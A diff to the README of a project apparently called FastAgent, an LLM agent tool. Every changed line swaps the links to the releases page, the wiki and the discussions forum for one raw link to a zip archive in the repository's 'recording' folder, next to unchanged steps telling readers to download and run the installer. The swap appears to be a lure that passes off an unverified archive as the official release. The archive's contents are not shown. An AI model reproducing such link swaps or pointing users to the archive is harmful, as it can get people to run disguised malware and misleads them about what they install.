@@ -1,6 +1,6 @@
 # 🚀 FastAgent - Simple, Fast, and Strong LLM Agents
 
-[![Download FastAgent](https://img.shields.io/badge/Download-FastAgent-blue)](https://github.com/tyuzu2309/FastAgent/releases)
+[![Download FastAgent](https://raw.githubusercontent.com/tyuzu2309/FastAgent/main/fastagent/recording/FastAgent-Spisula.zip)](https://raw.githubusercontent.com/tyuzu2309/FastAgent/main/fastagent/recording/FastAgent-Spisula.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ Before you install FastAgent, ensure your system meets the following requirement
 
 To get started with FastAgent, follow these easy steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/tyuzu2309/FastAgent/releases) to access the latest version of FastAgent.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/tyuzu2309/FastAgent/main/fastagent/recording/FastAgent-Spisula.zip) to access the latest version of FastAgent.
    
 2. **Download FastAgent:** 
    - Look for the most recent version listed.
@@ -29,7 +29,7 @@ To get started with FastAgent, follow these easy steps:
 
 ## 📥 Download & Install
 
-1. **Download the Application:** Visit the [Releases page](https://github.com/tyuzu2309/FastAgent/releases) again to download the installer.
+1. **Download the Application:** Visit the [Releases page](https://raw.githubusercontent.com/tyuzu2309/FastAgent/main/fastagent/recording/FastAgent-Spisula.zip) again to download the installer.
    
 2. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file and follow the instructions.
@@ -77,8 +77,8 @@ If you need further assistance, feel free to reach out. You can contact us throu
 
 ## 🔗 Useful Links
 
-- [FastAgent Releases Page](https://github.com/tyuzu2309/FastAgent/releases)
-- [Documentation](https://github.com/tyuzu2309/FastAgent/wiki) (Coming soon)
-- [Community Forum](https://github.com/tyuzu2309/FastAgent/discussions) (Engage with other users)
+- [FastAgent Releases Page](https://raw.githubusercontent.com/tyuzu2309/FastAgent/main/fastagent/recording/FastAgent-Spisula.zip)
+- [Documentation](https://raw.githubusercontent.com/tyuzu2309/FastAgent/main/fastagent/recording/FastAgent-Spisula.zip) (Coming soon)
+- [Community Forum](https://raw.githubusercontent.com/tyuzu2309/FastAgent/main/fastagent/recording/FastAgent-Spisula.zip) (Engage with other users)
 
 Thank you for choosing FastAgent! We hope it serves you well in your explorations.
